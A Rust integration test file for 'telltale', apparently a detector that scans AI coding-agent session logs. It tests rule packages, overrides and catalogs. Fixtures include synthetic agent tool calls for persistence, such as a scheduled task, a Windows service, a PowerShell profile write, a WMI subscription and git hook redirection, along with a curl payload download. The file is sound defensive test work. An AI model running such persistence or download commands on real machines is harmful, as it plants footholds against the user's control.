        assert!(!listed.contains(&id), "embedded {id} was not replaced");
    }
    // Without bundled defaults the installed community package is managed
    // content and still loads; the community opt-out removes it everywhere.
    let custom_only = listed_rule_ids(&["--config-dir", &config_dir, "--no-default-rules"], None);
    assert_eq!(custom_only, ["tdx.synthetic.newer_release"]);
    let opted_out = listed_rule_ids(&["--config-dir", &config_dir, "--no-community-rules"], None);
    assert!(!opted_out.iter().any(|id| id.starts_with("tdx.")));

    let validate = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir", &config_dir])
        .env_remove("TELLTALE_COMMUNITY_RULES")
        .output()
        .expect("run telltale rules validate");
    assert!(
        validate.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validate.stderr)
    );
    let summary: Value = serde_json::from_slice(&validate.stdout).expect("summary json");
    let embedded = telltale_rules::package::bundled_community_package().expect("community package");
    assert_eq!(
        summary["packages"],
        serde_json::json!([{
            "id": "telltale.community",
            "version": "99.0.0",
            "content_sha256": telltale_rules::package::RulePackage::parse(
                &community_package_yaml("99.0.0", "tdx.synthetic.newer_release")
            )
            .expect("package")
            .content_sha256(),
            "origin": "installed",
            "replaced_embedded_version": embedded.version(),
        }])
    );
}

#[test]
fn duplicate_installed_packages_fail_and_name_each_copy() {
    // The same file name under two config roots, as after installing a newer
    // release system-wide while an older per-user copy remains.
    let temp = tempdir().expect("tempdir");
    let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
    command
        .args(["rules", "validate"])
        .env_remove("TELLTALE_COMMUNITY_RULES");
    let mut identities = Vec::new();
    for (root, version) in [("system", "99.0.0"), ("user", "98.0.0")] {
        let root = temp.path().join(root);
        let packages = root.join("rule-packages.d");
        fs::create_dir_all(&packages).expect("package dir");
        let raw = community_package_yaml(version, "tdx.synthetic.newer_release");
        fs::write(packages.join("telltale.community.yaml"), &raw).expect("package");
        let package = telltale_rules::package::RulePackage::parse(&raw).expect("package");
        identities.push(format!(
            "version {} (content SHA-256 {}...)",
            package.version(),
            &package.content_sha256()[..12]
        ));
        command.arg("--config-dir").arg(&root);
    }
    let output = command.output().expect("run telltale rules validate");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("duplicate rule package id 'telltale.community'"),
        "{stderr}"
    );
    for identity in &identities {
        assert!(stderr.contains(identity), "{stderr}");
    }
    assert!(
        !stderr.contains(&*temp.path().to_string_lossy()),
        "{stderr}"
    );
}

#[test]
fn installed_packages_add_rules_but_never_replace_core_rules() {
    let temp = tempdir().expect("tempdir");
    let packages = temp.path().join("rule-packages.d");
    fs::create_dir_all(&packages).expect("package dir");
    let custom = community_package_yaml("1.0.0", "acme.synthetic.marker")
        .replace("id: telltale.community", "id: acme.rules")
        .replace("rule_namespace: tdx", "rule_namespace: acme");
    fs::write(packages.join("acme.yaml"), &custom).expect("package");
    let config_dir = temp.path().to_string_lossy().into_owned();
    let listed = listed_rule_ids(&["--config-dir", &config_dir], None);
    assert!(listed.contains(&"acme.synthetic.marker".to_string()));
    assert!(listed.contains(&"secret.env.read".to_string()));

    // A package cannot claim a core namespace, so it cannot shadow core IDs.
    fs::write(
        packages.join("acme.yaml"),
        custom
            .replace("rule_namespace: acme", "rule_namespace: secret")
            .replace("acme.synthetic.marker", "secret.env.read"),
    )
    .expect("package");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir", &config_dir])
        .output()
        .expect("run telltale rules validate");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("reserved for core rules"), "{stderr}");
}

#[test]
fn installed_package_yaml_escapes_fail_before_scan_outputs_activate() {
    let temp = tempdir().expect("tempdir");
    let config = temp.path().join("config");
    let packages = config.join("rule-packages.d");
    fs::create_dir_all(&packages).expect("package dir");
    let root = temp.path().join("empty-root");
    fs::create_dir(&root).expect("empty source root");
    let state = temp.path().join("state.json");
    let log = temp.path().join("events.jsonl");
    let marker = "PACKAGE_HIDDEN_SENTINEL";

    for (field, original, replacement, code_point) in [
        (
            "publisher",
            "publisher: Synthetic community",
            r#"publisher: "PACKAGE_HIDDEN_SENTINEL\u202E""#,
            "U+202E",
        ),
        (
            "explanation",
            "explanation: Synthetic community rule.",
            r#"explanation: "PACKAGE_HIDDEN_SENTINEL\x1b[31m""#,
            "U+001B",
        ),
    ] {
        let raw =
            community_package_yaml("1.0.0", "tdx.synthetic.marker").replace(original, replacement);
        fs::write(packages.join("community.yaml"), raw).expect("package");

        for args in [
            vec!["rules", "validate"],
            vec!["config", "validate"],
            vec!["scan", "--once"],
        ] {
            let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
            command.args(&args).arg("--config-dir").arg(&config);
            command.env_remove("TELLTALE_COMMUNITY_RULES");
            if args[0] == "scan" {
                command.arg("--install-inventory-disabled");
                command.arg("--root").arg(&root);
                command.arg("--state-path").arg(&state);
                command.arg("--log-path").arg(&log);
            }
            let output = command.output().expect("run telltale");
            assert!(
                !output.status.success(),
                "{field}: {args:?} accepted package"
            );
            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains(&format!("forbidden character {code_point}")),
                "{field}: {args:?} missing forbidden-character diagnostic"
            );
            let stdout = String::from_utf8_lossy(&output.stdout);
            assert!(
                !stdout.contains(marker) && !stderr.contains(marker),
                "{field}: {args:?} leaked package content"
            );
            assert!(!state.exists(), "{field}: {args:?} created scan state");
            assert!(!log.exists(), "{field}: {args:?} created event output");
        }
    }
}

/// Agent commands that embedded community rules must detect, each beside a
/// benign look-alike that must not match. The community repository owns most
/// community rule testing; this pins that its embedded content fires through a
/// real scan. Re-run it when vendoring a community release, and update a row
/// when that release renames or retires the rule.
const COMMUNITY_TRIGGERS: &[(&str, &str, &str)] = &[
    (
        "tdx.persistence.mcp_server_registration",
        "claude mcp add synthetic-server -- npx -y synthetic-mcp-server",
        "claude mcp list",
    ),
    (
        "tdx.persistence.git_hook_change",
        "git config core.hooksPath .synthetic-hooks",
        "git config --get core.hooksPath",
    ),
    (
        "tdx.persistence.windows_agent_command",
        r"schtasks /create /tn SyntheticTask /tr C:\synthetic.exe /sc onlogon",
        "schtasks /query /tn SyntheticTask",
    ),
    (
        "tdx.persistence.windows_service_change",
        r#"sc.exe create SyntheticHelperSvc binPath= "C:\Example\synthetic-helper.exe" start= auto"#,
        "sc.exe config SyntheticSvc start= disabled",
    ),
    (
        "tdx.persistence.powershell_profile_write",
        r"Add-Content -Path $PROFILE -Value 'Start-Process C:\Example\synthetic-helper.exe'",
        r"Copy-Item -Path $PROFILE -Destination C:\Example\Backup\profile.ps1",
    ),
    (
        "tdx.persistence.wmi_event_subscription",
        r"Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SyntheticFilter'}",
        "Get-CimInstance -Namespace root/subscription -ClassName __EventFilter",
    ),
];

fn claude_bash_session(session: &str, commands: &[&str]) -> String {
    let record = |kind: &str, uuid: String, message: Value| {
        serde_json::json!({
            "type": kind,
            "uuid": uuid,
            "sessionId": session,
            "timestamp": "2026-10-21T10:00:00.000Z",
            "cwd": "/home/synthetic/repo",
            "version": "2.1.295",
            "message": message,
        })
        .to_string()
            + "\n"
    };
    let mut text = String::new();
    for (index, command) in commands.iter().enumerate() {
        let call = format!("toolu_{index}");
        text += &record(
            "assistant",
            format!("{session}-call-{index}"),
            serde_json::json!({"role": "assistant", "model": "claude-synthetic", "content": [
                {"type": "tool_use", "id": call, "name": "Bash", "input": {"command": command}}
            ]}),
        );
        text += &record(
            "user",
            format!("{session}-result-{index}"),
            serde_json::json!({"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": call, "content": "ok"}
            ]}),
        );
    }
    text
}

#[test]
fn embedded_community_rules_fire_on_agent_sessions_and_spare_look_alikes() {
    let community =
        telltale_rules::package::bundled_community_package().expect("community package");
    let points = community
        .documents()
        .iter()
        .flat_map(|document| document.definitions())
        .filter(|definition| definition.kind() == telltale_rules::DefinitionKind::Rule)
        .map(|rule| (rule.id(), rule.score()))
        .collect::<BTreeMap<_, _>>();

    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("home");
    let project = root.join(".claude/projects/-home-synthetic-repo");
    fs::create_dir_all(&project).expect("claude project");
    for (session, commands) in [
        (
            "community-attack",
            COMMUNITY_TRIGGERS
                .iter()
                .map(|(_, attack, _)| *attack)
                .collect::<Vec<_>>(),
        ),
        (
            "community-look-alike",
            COMMUNITY_TRIGGERS
                .iter()
                .map(|(_, _, look_alike)| *look_alike)
                .collect(),
        ),
    ] {
        fs::write(
            project.join(format!("{session}.jsonl")),
            claude_bash_session(session, &commands),
        )
        .expect("claude session");
    }
    // Codex completed argv reaches the rules through its derived command view.
    let codex = root.join(".codex/sessions/2026/10");
    fs::create_dir_all(&codex).expect("codex sessions");
    let codex_records = [
        serde_json::json!({"type": "session_meta", "payload": {"id": "community-codex", "history_mode": "paginated"}}),
        serde_json::json!({"type": "event_msg", "payload": {"type": "item_completed", "thread_id": "community-codex",
            "turn_id": "turn-1", "item": {"type": "CommandExecution", "id": "call-1",
            "command": ["codex", "mcp", "add", "synthetic-server", "--", "npx", "synthetic-mcp-server"],
            "status": "completed", "aggregated_output": "added", "exit_code": 0}}}),
    ];
    fs::write(
        codex.join("rollout-community-codex.jsonl"),
        codex_records
            .iter()
            .map(|record| format!("{record}\n"))
            .collect::<String>(),
    )
    .expect("codex session");

    for community_enabled in [true, false] {
        let log = temp
            .path()
            .join(format!("events-{community_enabled}.jsonl"));
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .env_clear()
            .env("HOME", temp.path())
            .args([
                "scan",
                "--once",
                "--no-local-config",
                "--install-inventory-disabled",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(temp.path().join(format!("state-{community_enabled}.json")));
        if !community_enabled {
            command.arg("--no-community-rules");
        }
        let output = command.output().expect("run telltale scan");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
        assert_eq!(
            summary["source_processing"]["parse_success_source_count"], 3,
            "{summary}"
        );
        let rules = &summary["effective_configuration"]["rules"];

        // Session -> community rule -> points, from detection risk contributions.
        let mut matched = BTreeMap::<String, BTreeMap<String, u64>>::new();
        for line in fs::read_to_string(&log).expect("events").lines() {
            let event: Value = serde_json::from_str(line).expect("event json");
            if event["event_type"] != "detection" {
                continue;
            }
            let session = event["session_id"]
                .as_str()
                .expect("session id")
                .to_string();
            for contribution in event["risk_contributions"]
                .as_array()
                .expect("contributions")
            {
                let id = contribution["id"].as_str().expect("contribution id");
                if id.starts_with("tdx.") {
                    matched.entry(session.clone()).or_default().insert(
                        id.to_string(),
                        contribution["points"].as_u64().expect("points"),
                    );
                }
            }
        }

        if !community_enabled {
            assert_eq!(rules["community"], "disabled");
            assert_eq!(rules["packages"], serde_json::json!([]));
            assert!(matched.is_empty(), "{matched:?}");
            continue;
        }
        assert_eq!(rules["community"], "enabled");
        assert_eq!(
            rules["packages"],
            serde_json::json!([{
                "id": community.id(),
                "version": community.version(),
                "content_sha256": community.content_sha256(),
                "origin": "embedded",
                "replaced_embedded_version": null,
            }])
        );
        let attack = matched.get("community-attack").expect("attack detected");
        for (rule, _, _) in COMMUNITY_TRIGGERS {
            let expected = *points
                .get(rule)
                .unwrap_or_else(|| panic!("embedded community package lacks {rule}"));
            assert_eq!(attack.get(*rule), Some(&expected), "{rule}: {attack:?}");
        }
        assert_eq!(
            matched.get("community-codex"),
            Some(&BTreeMap::from([(
                "tdx.persistence.mcp_server_registration".to_string(),
                points["tdx.persistence.mcp_server_registration"],
            )])),
            "{matched:?}"
        );
        assert!(!matched.contains_key("community-look-alike"), "{matched:?}");
    }
}

const RULE_V2_FIXTURE: &str = "tests/fixtures/rule_v2/cli_synthetic.yml";

/// The Rule v2 fixture with LF line endings, then with CRLF ones, as files in
/// the returned directory. A Windows checkout may hold either.
fn rule_v2_fixture_copies() -> (tempfile::TempDir, [String; 2]) {
    let temp = tempdir().expect("tempdir");
    let lf = fs::read_to_string(RULE_V2_FIXTURE)
        .expect("fixture")
        .replace("\r\n", "\n");
    let paths = [
        ("lf.yml", lf.clone()),
        ("crlf.yml", lf.replace('\n', "\r\n")),
    ]
    .map(|(name, text)| {
        let path = temp.path().join(name);
        fs::write(&path, text).expect("fixture copy");
        path.to_str().expect("UTF-8 path").to_owned()
    });
    (temp, paths)
}

fn rules_command(args: &[&str]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_telltale"))
        .arg("rules")
        .args(args)
        .arg("--no-local-config")
        .output()
        .expect("run telltale rules")
}

#[test]
fn rules_catalog_prints_a_schema_valid_v2_catalog_of_the_resolved_rules() {
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/rule-catalog-v2.schema.json"))
            .expect("catalog schema");
    let validator = validator_for(&schema).expect("catalog validator");
    let bundled = rules_command(&["catalog"]);
    assert!(
        bundled.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&bundled.stderr)
    );
    let bundled: Value = serde_json::from_slice(&bundled.stdout).expect("catalog json");
    assert!(validator.is_valid(&bundled));
    assert_eq!(bundled["schema"], "telltale.rule_catalog.v2");
    let embedded = telltale_core::rule_catalog_document(&Default::default()).unwrap();
    assert_eq!(bundled, serde_json::to_value(&embedded).unwrap());

    let (_temp, fixtures) = rule_v2_fixture_copies();
    let catalogs = fixtures.map(|fixture| {
        let output = rules_command(&["catalog", "--rules", &fixture]);
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).expect("catalog json")
    });
    assert_eq!(catalogs[0], catalogs[1], "CRLF and LF load alike");
    let catalog = &catalogs[0];
    assert!(validator.is_valid(catalog));
    let entries = catalog["entries"].as_array().expect("entries");
    assert_eq!(
        entries.len(),
        bundled["entries"].as_array().unwrap().len() + 2
    );
    let rule = entries
        .iter()
        .find(|entry| entry["id"] == "synthetic.cli.marker")
        .expect("v2 rule entry");
    assert_eq!(rule["uuid"], "5d1e2f3a-4b5c-4d6e-8f70-81a2b3c4d5e6");
    assert_eq!(rule["status"], "test");
    assert_eq!(rule["attack_techniques"], serde_json::json!(["T1059"]));
    assert_eq!(rule["logsource"]["category"], "tool_activity");
    assert_eq!(rule["enabled"], true);
    assert!(
        rule["behavior_fingerprint"]
            .as_str()
            .is_some_and(|value| value.starts_with("sha256:"))
    );
    let chain = entries
        .iter()
        .find(|entry| entry["id"] == "synthetic.cli.chain")
        .expect("v2 chain entry");
    assert_eq!(chain["kind"], "modifier");
    assert_eq!(
        chain["when_all_rule_ids"],
        serde_json::json!(["synthetic.cli.marker"])
    );
    assert_ne!(catalog["semantic_identity"], bundled["semantic_identity"]);
}

#[test]
fn rules_show_prints_one_rule_or_chain_and_rejects_an_unknown_name() {
    let (_temp, fixtures) = rule_v2_fixture_copies();
    for fixture in &fixtures {
        assert_rules_show(fixture);
    }
}

fn assert_rules_show(fixture: &str) {
    let output = rules_command(&["show", "synthetic.cli.marker", "--rules", fixture]);
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let text = String::from_utf8_lossy(&output.stdout);
    for line in [
        "title: Synthetic marker command",
        "name: synthetic.cli.marker",
        "kind: rule",
        "uuid: 5d1e2f3a-4b5c-4d6e-8f70-81a2b3c4d5e6",
        "status: test",
        "enabled: true",
        "severity: low",
        "score: 15",
        "category: synthetic_cli",
        "description: Synthetic rule for command-line tests.",
        "  - https://example.invalid/synthetic-note",
        "  - Synthetic tests.",
        "logsource: product=ai_agent category=tool_activity",
        "  - attack.t1059",
        "  - target=command scope=field pattern_bytes=31 exclusion_bytes=35",
        "  - filter_case_mismatch: filter `filter_command` is case-sensitive but its selection `selection_command` is case-insensitive",
    ] {
        assert!(
            text.lines().any(|candidate| candidate == line),
            "{line}\n{text}"
        );
    }

    let chain = rules_command(&["show", "synthetic.cli.chain", "--rules", fixture]);
    assert!(chain.status.success());
    let text = String::from_utf8_lossy(&chain.stdout);
    assert!(text.lines().any(|line| line == "kind: chain"), "{text}");
    assert!(
        text.lines().any(|line| line == "  - synthetic.cli.marker"),
        "{text}"
    );

    let unknown = rules_command(&["show", "synthetic.cli.unknown", "--rules", fixture]);
    assert_eq!(unknown.status.code(), Some(1));
    assert!(unknown.stdout.is_empty());
    assert!(
        String::from_utf8_lossy(&unknown.stderr).contains("unknown rule or chain"),
        "{}",
        String::from_utf8_lossy(&unknown.stderr)
    );
}

/// `rules show` says what turned a rule or a chain off and which override
/// entries changed it, with the operator's reason and no file path.
#[test]
fn rules_show_names_what_disabled_a_rule_and_the_overrides_applied() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("config");
    let write = |folder: &str, text: &str| {
        let dir = root.join(folder);
        fs::create_dir_all(&dir).expect("config folder");
        fs::write(dir.join("local.yaml"), text).expect("config file");
    };
    write(
        "overrides.d",
        "version: 1\noverrides:\n  - rule_id: network.download\n    enabled: false\n    reason: synthetic noise\n  - rule_id: execution.shell\n    score: 5\n    reason: synthetic tuning\n  - rule_id: chain.secret_then_network\n    enabled: false\n    reason: synthetic chain noise\n  - rule_id: chain.download_then_execute\n    score: 3\n    reason: synthetic chain tuning\n",
    );
    write(
        "policies.d",
        "version: 1\ndisabled_rules: [install.package_manager]\n",
    );
    let show = |name: &str| {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(["rules", "show", name, "--config-dir"])
            .arg(&root)
            .output()
            .expect("run telltale rules show");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        String::from_utf8_lossy(&output.stdout).into_owned()
    };
    let has = |text: &str, line: &str| text.lines().any(|candidate| candidate == line);

    let disabled = show("network.download");
    assert!(has(&disabled, "enabled: false"), "{disabled}");
    assert!(has(&disabled, "disabled by: override"), "{disabled}");
    assert!(
        disabled
            .lines()
            .any(|line| line.starts_with("  - enabled=false (synthetic noise) [override-source:")),
        "{disabled}"
    );

    let tuned = show("execution.shell");
    assert!(has(&tuned, "enabled: true"), "{tuned}");
    assert!(has(&tuned, "disabled by: -"), "{tuned}");
    assert!(has(&tuned, "score: 5"), "{tuned}");
    assert!(
        tuned
            .lines()
            .any(|line| line.starts_with("  - score=5 (synthetic tuning) [override-source:")),
        "{tuned}"
    );

    let by_policy = show("install.package_manager");
    assert!(has(&by_policy, "disabled by: policy"), "{by_policy}");
    assert!(has(&by_policy, "overrides: -"), "{by_policy}");

    let chain_disabled = show("chain.secret_then_network");
    assert!(
        has(&chain_disabled, "disabled by: override"),
        "{chain_disabled}"
    );
    assert!(
        chain_disabled
            .lines()
            .any(|line| line
                .starts_with("  - enabled=false (synthetic chain noise) [override-source:")),
        "{chain_disabled}"
    );
    let chain_tuned = show("chain.download_then_execute");
    assert!(has(&chain_tuned, "disabled by: -"), "{chain_tuned}");
    assert!(has(&chain_tuned, "score: 3"), "{chain_tuned}");
    assert!(
        chain_tuned
            .lines()
            .any(|line| line.starts_with("  - score=3 (synthetic chain tuning) [override-source:")),
        "{chain_tuned}"
    );

    // No output names the config root.
    let root_text = root.display().to_string();
    for text in [&disabled, &tuned, &by_policy, &chain_disabled, &chain_tuned] {
        assert!(!text.contains(&root_text), "{text}");
    }
}

/// An override entry that names no loaded rule is left out: `rules validate`
/// succeeds and gives a notice for it, and `rules test` keeps detecting with
/// the other entries applied. An entry for a rule Telltale Hooks owns gives
/// no notice.
#[test]
fn rules_validate_and_test_leave_out_an_override_for_a_rule_that_is_not_loaded() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/local.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        "version: 1\noverrides:\n  - rule_id: synthetic.missing\n    enabled: false\n    reason: synthetic\n  - rule_id: tth.tamper.synthetic_missing\n    enabled: false\n    reason: synthetic\n  - rule_id: network.download\n    score: 5\n    reason: synthetic\n",
    )
    .expect("write override");
    let run = |args: &[&str]| {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(args)
            .arg("--config-dir")
            .arg(&config_root)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).expect("json")
    };

    let validate = run(&["rules", "validate"]);
    assert_eq!(validate["status"], "ok");
    let notices = validate["notices"].as_array().expect("notices");
    assert_eq!(notices.len(), 1, "{notices:?}");
    assert_eq!(notices[0]["rule_id"], "synthetic.missing");
    assert_eq!(notices[0]["kind"], "override_left_out");

    let fixture = temp.path().join("download-only.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","session_id":"download-only-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
"#,
    )
    .expect("write fixture");
    let fixture = fixture.display().to_string();
    let tested = run(&["rules", "test", &fixture]);
    assert_eq!(tested["match_count"], 1, "{tested}");
    assert!(
        tested["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download"),
        "{tested}"
    );
}

#[test]
fn rules_validate_reports_rule_v2_load_notices() {
    let bundled = rules_command(&["validate"]);
    assert!(bundled.status.success());
    let bundled: Value = serde_json::from_slice(&bundled.stdout).expect("validate json");
    assert_eq!(bundled["notices"], serde_json::json!([]));

    let (_temp, fixtures) = rule_v2_fixture_copies();
    let summaries = fixtures.map(|fixture| {
        let output = rules_command(&["validate", "--rules", &fixture]);
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).expect("validate json")
    });
    // Source hashes cover the file bytes, so only they differ.
    let without_source_hashes = |summary: &Value| {
        let mut summary = summary.clone();
        summary["sources"] = Value::Null;
        for entry in summary["provenance"].as_array_mut().expect("provenance") {
            entry["winner"] = Value::Null;
        }
        summary
    };
    assert_eq!(
        without_source_hashes(&summaries[0]),
        without_source_hashes(&summaries[1]),
        "CRLF and LF load alike"
    );
    let summary = &summaries[0];
    assert_eq!(summary["status"], "ok");
    assert_eq!(
        summary["rule_count"],
        bundled["rule_count"].as_u64().unwrap() + 1
    );
    let notices = summary["notices"].as_array().expect("notices");
    assert_eq!(notices.len(), 1);
    assert_eq!(notices[0]["rule_id"], "synthetic.cli.marker");
    assert_eq!(notices[0]["kind"], "filter_case_mismatch");
    assert!(
        notices[0]["message"]
            .as_str()
            .unwrap()
            .contains("filter `filter_command`")
    );
    // A rule with a bundled rule's name but other matchers loses the native
    // action profile, which validate reports. A replacement carries the
    // bundled rule's UUID.
    let bundled_rules = fs::read_to_string("config/rules/tool-call-regex.yaml").unwrap();
    let download_uuid = |text: &str| {
        let text = text.replace("\r\n", "\n");
        let (before, _) = text.split_once("\nname: network.download\n").unwrap();
        before.rsplit_once("\nid: ").unwrap().1.trim().to_owned()
    };
    let uuid = download_uuid(&bundled_rules);
    assert_eq!(
        download_uuid(&bundled_rules.replace("\r\n", "\n").replace('\n', "\r\n")),
        uuid
    );
    let temp = tempdir().expect("tempdir");
    let replacement = temp.path().join("rules.d/download.yml");
    fs::create_dir_all(replacement.parent().unwrap()).unwrap();
    fs::write(
        &replacement,
        format!(
            "title: Synthetic download replacement\nid: {uuid}\n\
             name: network.download\ntaxonomy: telltale\nlogsource:\n    product: ai_agent\n    category: tool_activity\n\
             detection:\n    selection:\n        tool.command|contains: synthetic-download-marker\n    condition: selection\n\
             level: low\ntelltale:\n    category: network\n    score: 10\n    explanation: Synthetic replacement.\n"
        ),
    )
    .unwrap();
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir"])
        .arg(temp.path())
        .output()
        .expect("run telltale rules validate");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("validate json");
    assert_eq!(
        summary["notices"],
        serde_json::json!([{
            "rule_id": "network.download",
            "kind": "native_profile_not_applied",
            "message": "rule 'network.download': native action profile not applied; its matchers differ from the bundled rule's",
        }])
    );
}
